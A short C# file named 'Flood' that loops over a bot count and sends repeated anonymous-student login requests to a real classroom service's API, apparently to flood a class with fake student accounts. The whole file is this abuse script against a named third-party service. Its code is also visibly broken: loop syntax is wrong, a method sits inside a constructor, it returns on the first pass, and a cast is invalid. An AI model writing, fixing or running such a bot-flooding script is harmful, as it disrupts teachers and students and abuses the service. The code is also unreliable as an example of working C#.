using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net;
using System.IO;
using System.Diagnostics;

public class Flood
{
	public Flood()
	{
        static async Task<HttpWebResponse> Main(decimal botCount, string classcode, string name)
        {

            for (decimal i = 0, i < botCount, i++) { 
                var httpWebRequest = (System.Net.HttpWebRequest)WebRequest.Create("https://services.classkick.com/v1/users/login/anonymous-student");
                httpWebRequest.ContentType = "application/json";
                httpWebRequest.Method = "POST";

                name+=(i.ToString() + 1)
            

            
                Debug.Write(classcode);
                Debug.Write(name);


                using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
                {
                    string json = "{\"class_code\":\"" + classcode + "\"," +
                                  "\"name\":\"" + name + "\"}";
                    streamWriter.Write(json);
                }

                var httpResponse = (HttpWebResponse)httpWebRequest.GetResponseAsync();
                return httpResponse;
            }
        }
    }
}

